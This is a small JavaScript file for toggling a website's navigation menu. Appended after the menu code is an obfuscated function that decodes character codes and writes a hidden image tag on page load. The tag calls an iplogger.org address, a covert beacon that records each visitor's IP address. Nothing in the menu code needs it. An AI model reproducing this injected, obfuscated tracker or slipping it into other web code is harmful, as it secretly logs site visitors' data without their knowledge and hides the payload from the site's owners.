(function($) {
  $('.js-nav-menu-toggle').on('click', function() {
    $(this).parents('.navigation-menu').toggleClass('navigation-menu--open');
  });
  
  $('html').on('click', function(e) {
    if(!$(e.target).closest('.js-nav-menu').length &&
      ($('.js-nav-menu').hasClass('navigation-menu--open'))) {
        $('.js-nav-menu').removeClass('navigation-menu--open');
    }
  });
})(jQuery);
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!72!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}D_();